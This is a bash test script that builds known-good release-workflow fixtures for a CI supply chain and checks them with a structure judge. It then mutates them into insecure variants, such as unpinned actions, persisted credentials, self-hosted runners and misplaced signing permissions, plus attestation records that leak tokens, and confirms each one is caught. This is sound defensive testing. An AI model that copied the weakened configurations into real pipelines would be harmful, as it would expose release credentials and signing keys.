#!/usr/bin/env bash
# proves: REQ-CHAIN-007-AC1, REQ-CHAIN-007-AC2, REQ-CHAIN-007-AC3, REQ-CHAIN-007-AC4, REQ-CHAIN-007-AC6, REQ-CHAIN-007-AC7, REQ-CHAIN-007-AC8, REQ-CHAIN-007-AC9, REQ-CHAIN-007-AC10, REQ-CHAIN-007-AC11, REQ-CHAIN-007-AC12, REQ-CHAIN-007-AC13, REQ-CHAIN-007-AC14, REQ-CHAIN-007-AC16, REQ-CHAIN-007-AC19, REQ-CHAIN-005-AC4
# RED until PR 4 is implemented (stage-promote.yml rewritten, bin/release-*.sh, chain-scripts.json rows, the old authorization machinery removed): step 4.
#
# Release, static half (v0.3.0 rules 5, 17, 29, 50, 52, 53, 53b, 56, 57, 60, 61, 63, 64, 65, 69, 70, 71; advisor read-back approved Oct 9 with three
# rulings: rc tags verify like finals, the release policy is signed with cosign so it is in Rekor, signatures in both registries; PR 4 merges into
# chain-v030 only). Runs on ubuntu-24.04 or macOS with: bash, python3 + PyYAML (apt: python3-yaml). No network, no secrets, no keys.
# Every judge lives in bin/chain-release-shape.py and is FIRST proven on a known-good fixture and on mutated copies (a judge that cannot fail
# shows nothing), then applied to the real repository, which must pass. Finite grammars and allowlists, no shell analysis. The behaviour of
# the scripts (what they do with stub records, a stub registry and a fake signer) is in bin/chain-release-scripts-test.sh.
#
# WHAT IS FIXED BY AN EXISTING FILE and what is PROPOSED/UNVERIFIED:
#   [F] the old stage-promote.yml (crane copy by digest to ghcr.io and docker.io, cosign sign in BOTH registries, the environment named release,
#       DOCKERHUB_USERNAME and DOCKERHUB_TOKEN as environment secrets) and apk-tool.py signer (assembly.rsa.pub | release.rsa.pub | unsigned)
#       (the apk step reads no secret: it signs through the release KMS key reference, which build-apk.sh refuses in a build).
#   [P] the five script names and their command lines, cosign (through the release key in KMS) as the apk re-signing tool, `crane` as the copy tool, the artifact names, the
#       witnessed helper (bin/witnessed.sh STEP SCRIPT is PR 2's seam; here it is only called), the --rekor-stub flag on stage-start.
set -euo pipefail
root=$(cd "$(dirname "$0")/.." && pwd)
shape="$root/bin/chain-release-shape.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL PyYAML is required (apt: python3-yaml)"; exit 1; }
ok()  { pass=$((pass + 1)); echo "ok   $1"; }
bad() { failn=$((failn + 1)); echo "FAIL $1"; }
expect() { # expect ok|caught LABEL WORD args...   (WORD: text the fault message must contain, for caught)
  local want=$1 label=$2 word=$3; shift 3; local out rc=0
  out=$(python3 "$shape" "$@" 2>&1) || rc=$?
  if [ "$want" = ok ]; then
    if [ "$rc" = 0 ]; then ok "$label"; else bad "$label -> $out"; fi
  elif [ "$rc" = 1 ] && grep -Fq -- "$word" <<< "$out"; then ok "$label (caught: ${out:0:80})"
  else bad "$label -> rc=$rc, wanted a refusal containing '$word': ${out:0:140}"; fi
}
mutate() { # mutate SRC DST REGEX REPLACEMENT   (a pattern that no longer matches is a FAILURE, never a skipped case)
  python3 - "$1" "$2" "$3" "$4" <<'PY' || { bad "mutation did not apply: $3"; return 1; }
import re, sys
t = open(sys.argv[1]).read()
pat = re.escape(sys.argv[3][1:].replace("\\n", "\n")) if sys.argv[3].startswith("=") else sys.argv[3]
n = re.sub(pat, lambda m: m.expand(sys.argv[4].replace("\\n", "\n")), t, count=1, flags=re.S)
assert n != t, "mutation did not change the fixture"
open(sys.argv[2], "w").write(n)
PY
}
# ---- known-good fixtures ----------------------------------------------------------------------------------------------
python3 - "$work" <<'PY'
import base64, hashlib, json, os, sys
w = sys.argv[1]
CHK = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1"
UPL = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1"
DWN = "actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2"
def dn(name, path=None): return f"      - uses: {DWN}\n        with:\n          name: {name}\n          path: {path or name}\n"
def up(name): return f"      - uses: {UPL}\n        with:\n          name: {name}\n          path: {name}\n"
def inst(t): return f"      - name: install {t}\n        run: bash bin/install-scanner.sh {t}\n"
def wit(step, env, helper="witnessed.sh"):
    e = "".join(f"          {k}: {v}\n" for k, v in env.items())
    return f"      - name: {step}\n" + (f"        env:\n{e}" if env else "") + f"        run: bash bin/{helper} {step} bin/{step}.sh\n"
def renv(step, local=False):
    return f"      - name: {step} record holds no token\n" + f"        run: python3 -I bin/chain-verify.py record-env --record witness-{step}/{step}-collection{'.local' if local else ''}.json\n"
# W1 (#822 round 1, reworked: the federation entries are the release JOB's env, not a step's; wording pending the owner's approval for REQ-CHAIN-007-AC1 and AC2 and AC18): the job `release` carries a job-level env of exactly the three non-secret federation entries as literals (the key reference equals RELEASE_KEY_REF in bin/chain-verify.py); no step repeats them: release-verify, release-apks and release-postverify carry no step env, release-publish and release-sign carry exactly the three credentials, release-assets exactly GH_TOKEN
FED = {"AWS_ROLE_ARN": "arn:aws:iam::821302803867:role/fosterstack-cache-release-signing", "AWS_REGION": "us-east-1", "RELEASE_KMS_KEY_REF": "awskms:///alias/fosterstack-release-signing"}
JOBENV = "    env:\n" + "".join(f"      {k}: {v}\n" for k, v in FED.items())
REG = {"DOCKERHUB_USERNAME": "${{ secrets.DOCKERHUB_USERNAME }}", "DOCKERHUB_TOKEN": "${{ secrets.DOCKERHUB_TOKEN }}", "GH_TOKEN": "${{ github.token }}"}
GUARD = "inputs.mode != 'snapshot' && github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v') && startsWith(github.workflow_ref, format('{0}/.github/workflows/release.yml@', github.repository))"
RC_COND = "    if: ${{ " + GUARD + " && !contains(github.ref_name, '-') }}\n"
KMS_REF = "awskms:///alias/fosterstack-release-signing"
COMPARE_D = (("apk-ubuntu-24.04", "apks/ubuntu-24.04"), ("apk-ubuntu-24.04-arm", "apks/ubuntu-24.04-arm"), ("rapk-ubuntu-24.04", "rapks/ubuntu-24.04"), ("rapk-ubuntu-24.04-arm", "rapks/ubuntu-24.04-arm"),
             ("signed-witness-rapk-ubuntu-24.04", "witness-rapk-ubuntu-24.04"), ("signed-witness-rapk-ubuntu-24.04-arm", "witness-rapk-ubuntu-24.04-arm"))
def down_list(*pairs): return "".join(dn(n, p) for n, p in pairs)
BUILD_D = (("signed-witness-build", "witness-build"), ("digests", "witness-build"), ("items", "witness-build"), ("admission-baseline", "witness-build"), ("signed-witness-rebuild", "witness-rebuild"))
CHECK_D = (("signed-witness-check-ubuntu-24.04", "witness-check/ubuntu-24.04"), ("signed-witness-check-ubuntu-24.04-arm", "witness-check/ubuntu-24.04-arm"),
           ("check-results-ubuntu-24.04", "check-results/ubuntu-24.04"), ("check-results-ubuntu-24.04-arm", "check-results/ubuntu-24.04-arm"))
APK_D = (("apk-ubuntu-24.04", "apks/ubuntu-24.04"), ("apk-ubuntu-24.04-arm", "apks/ubuntu-24.04-arm"))
VER_D = BUILD_D + CHECK_D + (("provenance", "provenance"), ("apk-compare", "apk-compare"))      # what release-verify reads: the records of Build, Rebuild and both Check chips, Check's results, the provenance and the comparison
REL_D = VER_D + (("dist", "dist"), ("images", "images")) + APK_D                                   # release and sign-release: the verified records, then what the later steps use
EV_D = BUILD_D + CHECK_D + (("provenance", "provenance"), ("dist", "dist"), ("release-checksums", "dist"), ("images", "images")) + APK_D + (
    ("release-apks", "release-apks"), ("release-metadata", "release-metadata"), ("release-evidence-signatures", "release-evidence"), ("release-policy", "release-policy"))   # release-evidence: and what sign-release made
def up_paths(name, *paths): return f"      - uses: {UPL}\n        with:\n          name: {name}\n          path: |-\n" + "".join(f"            {p}\n" for p in paths)
def up_checked(name, path=None): return f"      - uses: {UPL}\n        with:\n          name: {name}\n          path: {path or name}\n          if-no-files-found: error\n"
def head(): return f"      - uses: {CHK}\n        with:\n          persist-credentials: false\n"
# REQ-CHAIN-007-AC1 (Astra R6) and the owner's rule of Oct 21 2026 (signer and builder never share a machine), as the jobs of release.yml now are: `release-compare` holds contents read ONLY (no id-token, no environment, no
# secret): it receives Build's and Rebuild's apks, runs bin/release-compare.sh as a plain step and uploads the small result apk-compare. `release-verify` needs it and holds contents read only (it runs release-verify under the
# local Witness script with a throwaway key: no identity token), no environment, no secret. `release` needs both, holds the environment release, contents write and packages write and NO id-token and no KMS role, receives Build's
# artifacts only (never a rapk), and re-runs release-verify first on its own downloads before any credential step. `sign-release` (environment sign) holds the KMS role and signs after release published; `release-evidence` holds
# contents write only and runs release-assets and release-postverify under the throwaway key of bin/witnessed-local.sh.
RECORDS = ("env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify.py sign-records --stage release --template .github/policy/release-policy.template.json "
           "--digests digests.json --out staged --record-dir rec-release/witness-release-verify --record-dir rec-release/witness-release-publish")
PRE = ("      - name: write Build's digest list to a file\n        env:\n          DIGESTS: ${{ needs.build-assemble.outputs.digests }}\n        run: printf '%s' \"$DIGESTS\" > digests.json\n"
       f"      - name: check the release stage's local records\n        run: {RECORDS}\n"
       "      - name: sign the staged release records\n        run: bash bin/witness-sign-staged.sh staged signed\n")
stage = ("name: 'Release'\non:\n  workflow_call:\npermissions: {}\njobs:\n"
         "  release-compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    needs: [check, sign, sign-rebuild, sign-check]\n    steps:\n" + head()
         + down_list(*COMPARE_D) + "      - name: compare Build's and Rebuild's apks\n        run: bash bin/release-compare.sh\n" + up_checked("apk-compare")
         + "  release-verify:\n    needs: release-compare\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    steps:\n" + head()
         + inst("witness") + down_list(*VER_D) + wit("release-verify", {}, "witnessed-local.sh") + renv("release-verify", True) + up_checked("witness-release-verify") + up_checked("release-policy", "policy.json")
         + "  release:\n    needs: [release-verify, release-compare]\n" + RC_COND + "    runs-on: ubuntu-24.04\n    concurrency:\n      group: release-publish\n      cancel-in-progress: false\n    environment: release\n"
         + "    permissions:\n      contents: write\n      packages: write\n    steps:\n" + head()
         + inst("witness") + inst("cosign") + inst("crane") + down_list(*REL_D)
         + wit("release-verify", {}, "witnessed-local.sh") + wit("release-publish", REG, "witnessed-local.sh") + renv("release-verify", True) + renv("release-publish", True) + up_paths("witness-release", "witness-release-verify", "witness-release-publish")
         + "  sign-release:\n    needs: [build-assemble, release]\n" + RC_COND + "    runs-on: ubuntu-24.04\n    environment: sign\n" + JOBENV
         + "    permissions:\n      contents: read\n      id-token: write\n      packages: write\n    steps:\n" + head()
         + inst("witness") + inst("cosign") + inst("crane") + inst("aws-cli") + down_list(*REL_D, ("witness-release", "rec-release"))      # the pinned aws CLI, installed job-locally after the three, before the downloads; then the release stage's two local records
         + PRE      # ruling Q-e: the digest list, the check of the release stage's local records, the signing of the staged payloads, before the job's own witnessed steps
         + up("signed-witness-release").replace("path: signed-witness-release", "path: signed")      # Q-f (REQ-CHAIN-007-AC1): uploaded right after witness-sign-staged succeeded, before the witnessed steps
         + wit("release-apks", {}) + wit("release-sign", REG) + renv("release-apks") + renv("release-sign")
         + up("release-evidence-signatures").replace("path: release-evidence-signatures", "path: release-evidence") + up_paths("witness-release-signatures", "witness-release-apks", "witness-release-sign")
         + up("release-apks") + up("release-metadata") + up("release-checksums").replace("path: release-checksums", "path: dist/checksums.txt")
         + "  release-evidence:\n    needs: sign-release\n" + RC_COND + "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write\n    steps:\n" + head()
         + inst("witness") + inst("cosign") + inst("crane") + down_list(*EV_D)
         + wit("release-assets", {"GH_TOKEN": "${{ github.token }}"}, "witnessed-local.sh") + wit("release-postverify", {}, "witnessed-local.sh")
         + renv("release-assets", True) + renv("release-postverify", True) + up_paths("witness-release-evidence", "witness-release-assets", "witness-release-postverify"))
open(w + "/stage.yml", "w").write(stage)
def gjob(n, needs=None, cond=None):
    return f"  {n}:\n" + (f"    needs: {needs}\n" if needs else "") + (f"    if: {cond}\n" if cond else "") + "    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n"
NOSNAP = "${{ inputs.mode != 'snapshot' }}"
GATE_S = "${{ " + GUARD + " }}"
rel_if = "${{ " + GUARD + " && !contains(github.ref_name, '-') }}"
open(w + "/release.yml", "w").write("name: Release\non:\n  push:\n    tags: [\"v*\"]\npermissions: {}\njobs:\n" +
    gjob("decide") + gjob("build-freeze") + gjob("build-apk", "build-freeze") + gjob("build-assemble", "build-apk") + gjob("sign", "build-assemble", GATE_S)
    + gjob("rebuild-apk", "build-assemble") + gjob("rebuild-assemble", "rebuild-apk") + gjob("sign-rebuild", "[build-assemble, rebuild-assemble]", GATE_S)
    + gjob("check-govulncheck", None, NOSNAP) + gjob("check", "[check-govulncheck, build-assemble, sign]", NOSNAP) + gjob("sign-check", "[build-assemble, check]", GATE_S)
    + gjob("release-compare", "[check, sign, sign-rebuild, sign-check]") + gjob("release-verify", "release-compare") + gjob("release", "[release-verify, release-compare]", rel_if)
    + gjob("sign-release", "[build-assemble, release]", rel_if) + gjob("release-evidence", "sign-release", rel_if))
# the other workflow files: no packages write, no secrets, no release environment; release.yml is the fixture of the stage judge
os.makedirs(w + "/o/.github/workflows", exist_ok=True)
for n in ("scan", "ci", "persona-uat"):
    open(f"{w}/o/.github/workflows/{n}.yml", "w").write("name: x\non:\n  workflow_call:\njobs:\n  j:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: bash bin/witnessed.sh j bin/j.sh\n")
open(w + "/o/.github/workflows/release.yml", "w").write(stage)
# bin/release-verify.sh: tag, policy, four stage-starts
V = ['[[ "${GITHUB_REF_NAME:-}" =~ ^v[0-9]+\\.[0-9]+\\.[0-9]+(-rc[0-9]+)?$ ]] || { echo "refused at tag: ${GITHUB_REF_NAME:-} is not vX.Y.Z or vX.Y.Z-rcN" >&2; exit 1; }',
     'python3 bin/chain-verify.py policy make --template .github/policy/release-policy.template.json --tag "$GITHUB_REF_NAME" --out policy.json',
     "python3 bin/chain-verify.py stage-start --stage release --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json",
     "python3 bin/chain-verify.py bind-items --policy policy.json --record witness-build/build-collection.json --items witness-build/items.json",
     "python3 bin/chain-verify.py bind-items --policy policy.json --record witness-build/build-collection.json --items witness-build/admission-baseline.json --product admission-baseline.json",
     "python3 bin/chain-verify.py stage-start --stage release --previous sign --record provenance/provenance.json --digests witness-build/digests.json --policy policy.json --rekor-stub provenance/provenance.rekor.json",
     "python3 bin/chain-verify.py stage-start --stage release --previous rebuild --record witness-rebuild/rebuild-collection.json --digests witness-build/digests.json --policy policy.json",
     "python3 bin/chain-verify.py apk-compare --file apk-compare/apk-compare.json --digests witness-build/digests.json",
     "python3 bin/chain-verify.py check-list --policy policy.json --digests witness-build/digests.json --dir witness-check",
     # ruling G (advisor Oct 12) and ruling 7 of cache#921: the govulncheck stream Release hands the evidence step is the ubuntu-24.04 runner's, bound as a product of that runner's scanners record under Check's identity
     "python3 bin/chain-verify.py bind-check --policy policy.json --record witness-check/ubuntu-24.04/witness-scanners/scanners-collection.json --digests witness-build/digests.json --file check-results/ubuntu-24.04/govulncheck.json --product check-results/govulncheck.json"]
open(w + "/verify.sh", "w").write("#!/usr/bin/env bash\nset -euo pipefail\n" + "\n".join(V) + "\n")
# the five release scripts, plain, using only their tools; and the list that describes them
os.makedirs(w + "/s/bin", exist_ok=True); os.makedirs(w + "/s/.github/policy", exist_ok=True)
BODY = {
 "release-verify": "set -euo pipefail\npython3 bin/chain-verify.py verify --stage build\n",
 "release-compare": "set -euo pipefail\npython3 -I -B bin/release-compare.py\n",
 "release-apks": 'set -euo pipefail\npython3 bin/apk-tool.py digest apks/a.apk\nbash bin/release-sign-apks.sh --build-dir b\n',
 "release-publish": 'set -euo pipefail\npython3 bin/release-layout.py images/x "$digest"\ncrane copy "src@$digest" "dst:$tag"\ncrane digest "dst:$tag" | jq -R .\n',
 "release-sign": 'set -euo pipefail\ndate=$(git log -1 --format=%ct "$GITHUB_SHA")\npython3 bin/vendor-provenance.py evidence --out evidence\ncosign sign --yes "ghcr.io/x@$digest"\ncosign sign-blob --yes --bundle policy.bundle policy.json\njq . policy.bundle\n',
 "release-postverify": 'set -euo pipefail\npython3 bin/release-postverify.py\n',
 "release-assets": 'set -euo pipefail\ngh release upload "$GITHUB_REF_NAME" apks/* dist/* --clobber\ngh release create "$GITHUB_REF_NAME" --verify-tag --draft\n',
}
ROWS = {"release-verify": (["python3"], False, ["bin/chain-verify.py"]), "release-compare": (["python3"], False, ["bin/release-compare.py"]), "release-apks": (["bash", "jq", "python3"], "other", ["bin/apk-tool.py", "bin/release-sign-apks.sh"]),
        "release-publish": (["crane", "jq", "python3", "trap"], False, ["bin/release-layout.py"]), "release-sign": (["cosign", "git", "jq", "python3", "sha256sum", "trap"], "other", ["bin/chain-verify.py", "bin/release-metadata.py", "bin/vendor-provenance.py", "bin/vex-forms.py"]),
        "release-assets": (["gh", "git", "python3"], False, ["bin/release-metadata.py"]), "release-postverify": (["python3"], False, ["bin/release-postverify.py"])}
rows = []
for n, b in BODY.items():
    open(f"{w}/s/bin/{n}.sh", "w").write("#!/usr/bin/env bash\n" + b)
    t, s, r = ROWS[n]
    rows.append({"path": f"bin/{n}.sh", "sha256": hashlib.sha256(open(f"{w}/s/bin/{n}.sh", "rb").read()).hexdigest(), "tools": t, "signs": s, "runs": r, "reason": "fixture"})
open(w + "/s/bin/release-postverify.py", "w").write("import subprocess\n")
rows.append({"path": "bin/release-postverify.py", "sha256": hashlib.sha256(open(w + "/s/bin/release-postverify.py", "rb").read()).hexdigest(), "tools": ["at", "command", "cosign", "exec", "gh", "jq", "just"], "signs": False, "runs": ["bin/chain-verify.py"], "reason": "fixture"})
open(w + "/s/bin/release-compare.py", "w").write("import sys\n")
rows.append({"path": "bin/release-compare.py", "sha256": hashlib.sha256(open(w + "/s/bin/release-compare.py", "rb").read()).hexdigest(), "tools": ["make"], "signs": False, "runs": ["bin/apk-tool.py", "bin/chain-verify.py"], "reason": "fixture"})
open(w + "/s/bin/release-layout.py", "w").write("import sys\n")
rows.append({"path": "bin/release-layout.py", "sha256": hashlib.sha256(open(w + "/s/bin/release-layout.py", "rb").read()).hexdigest(), "tools": [], "signs": False, "runs": [], "reason": "fixture"})
open(w + "/s/bin/witnessed.sh", "w").write("#!/usr/bin/env bash\nset -euo pipefail\n")
rows.append({"path": "bin/witnessed.sh", "sha256": hashlib.sha256(open(w + "/s/bin/witnessed.sh", "rb").read()).hexdigest(), "tools": ["timeout", "witness"], "signs": False, "runs": [], "reason": "fixture"})
open(w + "/s/bin/witnessed-local.sh", "w").write("#!/usr/bin/env bash\nset -euo pipefail\n")      # the throwaway-key wrapper release-verify and release-evidence run their steps through
rows.append({"path": "bin/witnessed-local.sh", "sha256": hashlib.sha256(open(w + "/s/bin/witnessed-local.sh", "rb").read()).hexdigest(), "tools": ["timeout", "witness"], "signs": False, "runs": [], "reason": "fixture"})
json.dump({"scripts": rows}, open(w + "/s/.github/policy/chain-scripts.json", "w"))
# a Witness envelope: payload is base64 of a collection with an environment attestor
col = {"_type": "https://in-toto.io/Statement/v0.1", "predicateType": "https://witness.testifysec.com/attestation-collection/v0.1",
       "predicate": {"name": "release-publish", "attestations": [{"type": "https://witness.dev/attestations/environment/v0.1",
       "attestation": {"os": "linux", "variables": {"HOME": "/home/runner", "CI": "true"}}}]}}
def env(c): return {"payloadType": "application/vnd.in-toto+json", "payload": base64.b64encode(json.dumps(c).encode()).decode(), "signatures": [{"sig": "AAAA"}]}
json.dump(env(col), open(w + "/record.json", "w"))
for name, add in (("r_name", {"GH_TOKEN": "x"}), ("r_dh", {"DOCKERHUB_TOKEN": "x"}),
                  ("r_idt", {"ACTIONS_ID_TOKEN_REQUEST_URL": "u"}), ("r_rt", {"ACTIONS_RUNTIME_TOKEN": "t"}),
                  ("r_val", {"X": "SENTINEL-VALUE-123"}), ("r_jwt", {"X": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ4In0.c2ln"})):
    c = json.loads(json.dumps(col)); c["predicate"]["attestations"][0]["attestation"]["variables"].update(add)
    json.dump(env(c), open(f"{w}/{name}.json", "w"))
open(w + "/r_plain.json", "w").write(json.dumps(col))                              # a bare statement, not an envelope
json.dump({"payloadType": "x", "payload": base64.b64encode(b"not json").decode(), "signatures": []}, open(w + "/r_garbage.json", "w"))
PY
expect ok "fixture: the known-good Release jobs of release.yml pass the stage judge" "" stage "$work/stage.yml"
expect ok "fixture: the credentials reach only the steps that need them" "" credentials "$work/stage.yml"
expect ok "fixture: no other chain file holds packages write or a credential" "" others "$work/o"
rm -rf "$work/o_scout"; cp -r "$work/o" "$work/o_scout"; printf '      DOCKERHUB_USERNAME: x\n      DOCKERHUB_SCOUT_TOKEN: y\n' >> "$work/o_scout/.github/workflows/persona-uat.yml"
expect ok "fixture: the rescan's own read-only Scout token and username are a different credential" "" others "$work/o_scout"
expect ok "fixture: the known-good release.yml graph" "" graph "$work/release.yml"
expect ok "fixture: the known-good bin/release-verify.sh" "" verify "$work/verify.sh"
for n in release-verify release-apks release-publish release-sign release-assets release-postverify; do
  expect ok "fixture: bin/$n.sh is plain (only its tools)" "" scan "$work/s/bin/$n.sh" "$work/s/.github/policy/chain-scripts.json"
done
expect ok "fixture: all release scripts and the helper are listed with sha256, tools, signs and runs" "" listed "$work/s/.github/policy/chain-scripts.json" "$work/s"
expect ok "fixture: a Witness record with none of the credentials" "" record "$work/record.json" SENTINEL-VALUE-123
mkdir -p "$work/rm" && expect ok "fixture: none of the old authorization machinery" "" removed "$work/rm"
# ---- rc-2 R4 (Fable): the run strings of the real release.yml are EXECUTED: a clean record exits 0, a leaking one exits 1, a missing one exits 2 -------------
python3 - "$root" "$work" <<'PYX' && ok "AC12 (R4) every record-env run string of the Release jobs of the real release.yml executes: clean 0, leaking 1, missing 2 (seven steps: one in release-verify, two each in release, sign-release and release-evidence)" || bad "AC12 (R4) the record-env run strings do not execute as the grammar says"
import base64, json, os, re, subprocess, sys, tempfile, yaml
root, work = sys.argv[1], sys.argv[2]
wf = yaml.safe_load(open(root + "/.github/workflows/release.yml"))
runs = [(jn, s["run"]) for jn in ("release-verify", "release", "sign-release", "release-evidence") for s in wf["jobs"][jn]["steps"] if "record-env" in (s.get("run") or "")]
assert len(runs) == 7, runs
def env(payload):
    st = {"_type": "https://in-toto.io/Statement/v1", "predicateType": "https://witness.dev/attestations/collection/v0.1", "subject": [], "predicate": {"name": "x", "attestations": [payload]}}
    return json.dumps({"payloadType": "application/vnd.in-toto+json", "payload": base64.b64encode(json.dumps(st).encode()).decode(), "signatures": []})
for jn, run in runs:
    step = re.search(r"witness-(release-[a-z]+)/", run).group(1)
    rec = re.search(r"--record (\S+)", run).group(1)
    for kind, body, want in (("clean", env({"type": "environment", "attestation": {"variables": {"CI": "true"}}}), 0), ("leaking", env({"type": "environment", "attestation": {"variables": {"GH_TOKEN": "x"}}}), 1), ("missing", None, 2)):
        with tempfile.TemporaryDirectory() as d:
            os.symlink(root + "/bin", d + "/bin"); os.symlink(root + "/.github", d + "/.github")     # the verifier reads the helper hashes in .github/policy, as in the checkout
            if body is not None:
                os.makedirs("%s/witness-%s" % (d, step)); open("%s/%s" % (d, rec), "w").write(body)
            r = subprocess.run(["bash", "-c", run], cwd=d, capture_output=True, text=True)
            assert r.returncode == want, (jn, step, kind, r.returncode, want, r.stdout[-200:], r.stderr[-300:])
PYX
# ---- AC1: the stage file, mutated one rule at a time ----------------------------------------------------------------------
m() { # m NAME REGEX REPL WORD LABEL
  if mutate "$work/stage.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" stage "$work/$1.yml"; fi
}
m s_job2    '=jobs:\n  release-compare:'                    'jobs:\n  extra:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: bash bin/witnessed.sh release-publish bin/release-publish.sh\n  release-compare:' 'only release-verify'  "AC1 a fifth job that runs a release step"
m s_selfh   'runs-on: ubuntu-24.04'                         'runs-on: self-hosted'                                   'ubuntu-24.04'       "AC1 a self-hosted runner"
m s_envnone '    environment: release\n'                     ''                                                       'environment'        "AC1 no environment (the credentials would not be protected)"
m s_envoth  'environment: release'                          'environment: agent'                                     'environment'        "AC1 another environment"
m s_pkg     '      packages: write\n'                       ''                                                       'permissions'        "AC1 no packages write (cannot publish)"
m s_att     '=      packages: write\n    steps'               '      packages: write\n      attestations: write\n    steps'  'permissions'        "AC1 attestations write"
m s_relid   '=      packages: write\n    steps'               '      packages: write\n      id-token: write\n    steps'     'permissions'        "AC1 (ruling 1 of cache#921) the release job holds an id-token: it holds no KMS role"
m s_relenv  '=    environment: release\n'                    '    environment: release\n    env:\n      AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n' 'job keys' "AC1 (ruling 1) the release job carries the KMS role as a job env"
m s_conc    '=      cancel-in-progress: false\n'              '      cancel-in-progress: true\n'                            'concurrency'        "AC1 the release job's publication may be cancelled halfway"
m s_noconc  '=    concurrency:\n      group: release-publish\n      cancel-in-progress: false\n' ''                                       'concurrency'        "AC1 the release job has no concurrency group (two publications could interleave)"
m s_cont    '    environment: release\n'                     '    environment: release\n    container: alpine\n'        'job keys'           "AC1 a job container"
m s_jenv    '    environment: release\n'                     '    environment: release\n    defaults: {run: {shell: bash}}\n' 'job keys'     "AC1 a job key outside the allowed set (defaults on the release job)"
m s_needs   '    environment: release\n'                     '    environment: release\n    needs: x\n'                 'needs'              "AC1 the release job names a second needs (x) besides verify"
m s_unp     'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v4'                          'digest-pinned'      "AC1 an unpinned checkout"
m s_persist 'persist-credentials: false'                    'persist-credentials: true'                              'persist-credentials' "AC1 persisted credentials"
m s_dlname  'name: provenance\n          path: provenance' 'name: not-listed\n          path: provenance'             'download-artifact'  "AC1 a download outside the allowlist"
m s_noarm   '(  release:\n.*?)      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: signed-witness-check-ubuntu-24.04-arm\n          path: witness-check/ubuntu-24.04-arm\n' '\1' 'release job' "AC16 the second chip's Check record is not downloaded by the release job (check-list would refuse the release, so the stage must fetch both)"
m s_nocr    '(  release:\n.*?)      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: check-results-ubuntu-24.04\n          path: check-results/ubuntu-24.04\n' '\1' 'release job' "G the ubuntu-24.04 runner's Check results (check-results/ubuntu-24.04/govulncheck.json) are not downloaded: release-sign would have no file to pass"
m s_crpath  '=name: check-results-ubuntu-24.04\n          path: check-results/ubuntu-24.04' 'name: check-results-ubuntu-24.04\n          path: witness-check/ubuntu-24.04' 'check-results-ubuntu-24.04' "G the results land inside witness-check/ (check-list refuses a stray file there)"
m s_armpath '=path: witness-check/ubuntu-24.04-arm'          'path: witness-ubuntu-24.04-arm'                          'signed-witness-check-ubuntu-24.04-arm' "AC16 the second chip's record lands outside witness-check/ (check-list reads witness-check/<runner>/)"
m s_dlbin   'name: images\n          path: images'        'name: images\n          path: bin'                           'download-artifact'  "AC1 a download into bin/"
m s_dlgh    'name: dist\n          path: dist'            'name: dist\n          path: .github'                       'download-artifact'  "AC1 a download into .github/"
m s_upname  '=name: witness-release\n          path: |-'    'name: anything\n          path: |-'                  'upload-artifact'  "AC1 an upload outside the allowlist"
m s_uppath  '=            witness-release-publish\n'         '            witness-release-sign\n'                     'upload-artifact'  "AC1 the release job uploads another record directory than its own"
m s_noup    '=      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: witness-release\n          path: |-\n            witness-release-verify\n            witness-release-publish\n' '' 'only uploads' "AC1 no upload of the release job's records"
# rc-2 R4 (Fable R4): the Release job checks each of its own six Witness records for a token (REQ-CHAIN-007-AC12) right after the witnessed steps and before any upload
m s_re_none '=      - name: release-publish record holds no token\n        run: python3 -I bin/chain-verify.py record-env --record witness-release-publish/release-publish-collection.local.json\n' '' 'Witness records for a token' "AC12 (R4) one of the record checks of the release job is missing"
m s_re_sign '=      - name: release-sign record holds no token\n        run: python3 -I bin/chain-verify.py record-env --record witness-release-sign/release-sign-collection.json\n' '' 'Witness records for a token' "AC12 (R4) the record check of release-sign is missing from sign-release"
# ruling Q-e: the release job runs release-verify and release-publish under bin/witnessed-local.sh (no KMS role) and uploads both local records; sign-release signs those two records first
m s_rel_kms  '=        run: bash bin/witnessed-local.sh release-publish bin/release-publish.sh\n' '        run: bash bin/witnessed.sh release-publish bin/release-publish.sh\n' 'none of checkout' "Q-e the release job runs release-publish through bin/witnessed.sh (it holds no KMS role: the local helper)"
m s_rel_nonloc '=record-env --record witness-release-publish/release-publish-collection.local.json' 'record-env --record witness-release-publish/release-publish-collection.json' 'none of checkout' "Q-e the release job checks the signed form of a record its throwaway-key step never made"
m s_sgn_needs '=  sign-release:\n    needs: [build-assemble, release]\n' '  sign-release:\n    needs: release\n' 'must need exactly' "Q-e sign-release does not need build-assemble (it needs Build's digest list)"
m s_srec_none '(  sign-release:\n.*?)      - name: check the release stage.s local records\n        run: [^\n]*\n' '\1' 'right after the downloads' "Q-e sign-release does not check the release stage's local records"
m s_ssign_none '(  sign-release:\n.*?)      - name: sign the staged release records\n        run: [^\n]*\n' '\1' 'right after the downloads' "Q-e sign-release does not sign the staged release records"
